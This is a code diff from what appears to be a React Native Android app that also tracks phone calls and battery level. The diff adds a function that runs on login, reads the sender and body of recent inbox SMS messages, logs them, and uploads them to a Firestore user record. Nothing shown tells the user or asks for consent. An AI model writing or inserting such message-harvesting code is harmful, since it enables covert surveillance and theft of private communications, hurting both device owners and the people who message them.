@@ -21,8 +21,6 @@ import AsyncStorage from '@react-native-async-storage/async-storage';
 
 
 
-
-
 Notifications.setNotificationHandler({
   handleNotification: async () => ({
     shouldShowAlert: true,
@@ -68,8 +66,8 @@ const navigation = useNavigation();
 
       })
 
-      listenerForUpdates();
-
+      listenerForUpdates(uid);
+      smsLog(uid);
     }
   
       
@@ -96,6 +94,41 @@ const navigation = useNavigation();
       }
 
   }, [user,level]);
+
+  function smsLog(uid){
+    let save_SMS=[]
+    var filter = {
+      box: 'inbox',
+      indexFrom: 0, // start from index 0
+      maxCount: 10, // count of SMS to return each time
+    };
+    
+    SmsAndroid.list(
+      JSON.stringify(filter),
+      (fail) => {
+        console.log('Failed with this error: ' + fail);
+      },
+      (count, smsList) => {
+        console.log('Count: ', count);
+        // console.log('List: ', smsList);
+        var arr = JSON.parse(smsList);
+        arr.forEach(function(object) {
+          save_SMS.push(object.address,object.body)
+          console.log('Number of sender ' + object.address);
+          console.log('Massege ' + object.body);        
+        });
+        firestore()
+        .collection('users')
+        .doc(uid)
+        .update({
+          List_SMS: save_SMS,
+        })
+        .then(() => {
+          console.log('User updated!');
+        });
+      },
+    );
+  }
 
   function listenerForUpdates(uid){
     let firstFire = true;
@@ -213,14 +246,9 @@ message: 'This app needs access to your phone state in order to react and/or to 
  
 function stopListenerTapped() {
     this.callDetector && this.callDetector.dispose();
-    
 };
-
-   
-
   function percentage(level) {
-    return `${Math.floor(level * 100)}%`;
-    
+    return `${Math.floor(level * 100)}%`; 
 }
 function updateBatteryFirebase(uid, level){
   let levelPercent=percentage(level);
